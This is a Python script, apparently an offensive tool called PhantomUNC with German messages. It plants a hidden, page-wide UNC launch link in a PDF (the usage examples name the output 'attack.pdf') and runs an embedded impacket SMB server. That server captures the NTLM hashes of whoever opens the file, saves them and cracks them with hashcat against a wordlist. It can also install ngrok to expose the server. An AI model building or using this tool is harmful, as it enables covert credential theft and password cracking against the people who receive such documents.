#!/usr/bin/env python3
import os
import sys
import fitz
import argparse
import shutil
import threading
import datetime
import subprocess
from impacket.examples import logger
from impacket.smbserver import SimpleSMBServer
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMAuthNegotiate

# Farben
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Logfile mit Datum & Uhrzeit in /var/log
now = datetime.datetime.now()
LOGFILE = f"/var/log/phantomunc_{now.strftime('%Y-%m-%d_%H-%M-%S')}.log"
HASHFILE = os.path.join(os.getcwd(), f"phantomunc_hashes_{now.strftime('%Y-%m-%d')}.txt")

def log(msg):
    timestamp = now.strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOGFILE, "a") as f:
        f.write(f"{timestamp} {msg}\n")

def save_hash(line):
    with open(HASHFILE, "a") as hf:
        hf.write(line + "\n")

def print_banner():
    banner = rf"""{RED}
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗██╗   ██╗███╗   ██╗ ██████╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║██║   ██║████╗  ██║██╔════╝
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║██║     
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
{BLUE}by ML-CyberSec – Unified SMB-Link Generator NTLM Capture Tool mit Integriertem SMB Server{RESET}
"""
    print(banner)

class PhantomUNCServer(SimpleSMBServer):
    def __init__(self, listenAddress='0.0.0.0', listenPort=445):
        super().__init__(listenAddress=listenAddress, listenPort=listenPort)

    def onAuthRequest(self, smbServer, connId, authRequest):
        clientIP = smbServer.getClientIP(connId)
        try:
            username = authRequest['USERNAME'].decode(errors='ignore')
            domain = authRequest['DOMAIN'].decode(errors='ignore')
            challenge = authRequest['CHALLENGE']
            response = authRequest['LM_RESPONSE'] + authRequest['NT_RESPONSE']
            hash_string = f"{username}::{domain}:{challenge.hex()}:{response.hex()}"
            print(f"{GREEN}🔑 Hash erhalten von {clientIP}: {hash_string}{RESET}")
            save_hash(hash_string)
            run_hashcat(wordlist_path=args.wordlist)
        except Exception as e:
            print(f"{RED}❌ Fehler beim Parsen der NTLM-Authentifizierung: {e}{RESET}")

def run_hashcat(wordlist_path=None):
    if not os.path.exists(HASHFILE):
        print(f"{RED}❌ Kein Hashfile vorhanden: {HASHFILE}{RESET}")
        return
    if not wordlist_path:
        wordlist_path = input(f"{CYAN}🔤 Pfad zur Wordlist angeben (z. B. /usr/share/wordlists/rockyou.txt): {RESET}").strip()
    if not os.path.isfile(wordlist_path):
        print(f"{RED}❌ Wordlist nicht gefunden: {wordlist_path}{RESET}")
        return
    print(f"{YELLOW}🚀 Starte Hashcat...{RESET}")
    os.system(f"hashcat -m 5600 {HASHFILE} {wordlist_path} --force")

def create_pdf(input_file, output_file, target_dir, unc_path):
    try:
        print(f"{YELLOW}📄 Erstelle PDF mit verstecktem UNC-Link...{RESET}")
        doc = fitz.open(input_file)
        page = doc[0]
        rect = fitz.Rect(0, 0, page.rect.width, page.rect.height)
        page.insert_link({
            "kind": fitz.LINK_LAUNCH,
            "from": rect,
            "file": unc_path
        })
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        output_path = os.path.join(target_dir, output_file)
        doc.save(output_path)
        doc.close()
        print(f"{GREEN}✅ PDF gespeichert: {output_path}{RESET}")
    except Exception as e:
        print(f"{RED}❌ Fehler bei PDF-Erstellung: {e}{RESET}")
        sys.exit(1)

def start_embedded_smb_server(share_name, share_path, port=445, listen_ip='0.0.0.0'):
    logger.init()
    server = PhantomUNCServer(listenAddress=listen_ip, listenPort=port)
    server.addShare(share_name, share_path, "")
    server.setSMB2Support(True)
    server.setLogFile(LOGFILE)
    print(f"{YELLOW}📡 SMB-Server läuft auf {listen_ip}:{port}, Share: {share_name} ({share_path}){RESET}")
    log(f"SMB gestartet → {listen_ip}:{port}, Share={share_name}, Pfad={share_path}")
    threading.Thread(target=server.start, daemon=True).start()
    return server

def install_ngrok():
    try:
        print(f"{YELLOW}📥 Lade ngrok herunter...{RESET}")
        subprocess.run("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip -O /tmp/ngrok.zip", shell=True, check=True)
        subprocess.run("unzip -o /tmp/ngrok.zip -d /tmp", shell=True, check=True)
        subprocess.run("sudo mv /tmp/ngrok /usr/local/bin/", shell=True, check=True)
        subprocess.run("sudo chmod +x /usr/local/bin/ngrok", shell=True, check=True)
        print(f"{GREEN}✅ ngrok wurde erfolgreich installiert.{RESET}")
    except subprocess.CalledProcessError:
        print(f"{RED}❌ Fehler bei der Installation von ngrok.{RESET}")

def main():
    print_banner()

    if shutil.which("ngrok") is None:
        install = input(f"{YELLOW}❓ ngrok ist NICHT installiert. Jetzt automatisch installieren? [J/N]: {RESET}").strip().lower()
        if install == "j":
            install_ngrok()


    parser = argparse.ArgumentParser(
        description=f"""
{CYAN}PhantomUNC – PDF UNC Injector + Integrierter SMB Server{RESET}

{YELLOW}Beispiele:{RESET}
  {GREEN}phantomunc --build-pdf -in input.pdf -out attack.pdf -D ./output{RESET}
  {GREEN}phantomunc --build-pdf -in input.pdf -out attack.pdf -D ./out --unc \\10.0.0.1\share{RESET}
  {GREEN}phantomunc --run-server -d /tmp/smbshare -s share{RESET}
  {GREEN}phantomunc --build-pdf -in file.pdf -out a.pdf -D . --run-server --port 1445{RESET}"""
    , formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--build-pdf", action="store_true", help="PDF mit UNC-Link erstellen")
    parser.add_argument("-in", dest="input_file", help="Pfad zur Eingabe-PDF")
    parser.add_argument("-out", help="Zielname der PDF")
    parser.add_argument("-D", help="Zielverzeichnis")
    parser.add_argument("--unc", default="\\\\192.168.0.158\\share", help="UNC-Link")
    parser.add_argument("--run-server", action="store_true", help="SMB-Server starten")
    parser.add_argument("-s", "--share", default="share", help="Name des SMB-Shares")
    parser.add_argument("-d", "--directory", default="/tmp/share", help="Pfad für SMB-Dateien")
    parser.add_argument("--port", type=int, default=445, help="Port für SMB-Server")
    parser.add_argument("--wordlist", help="Pfad zur Wordlist für Hashcat (optional)")

    args = parser.parse_args()

    if args.build_pdf:
        if not args.input_file or not args.out or not args.D:
            print(f"{RED}❗ Bitte -in, -out und -D angeben!{RESET}")
            sys.exit(1)
        create_pdf(args.input_file, args.out, args.D, args.unc)

    if args.run_server:
        if not os.path.exists(args.directory):
            os.makedirs(args.directory)
        start_embedded_smb_server(args.share, args.directory, port=args.port)

    if args.run_server:
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print(f"{YELLOW}🛑 Server gestoppt.{RESET}")

if __name__ == "__main__":
    main()
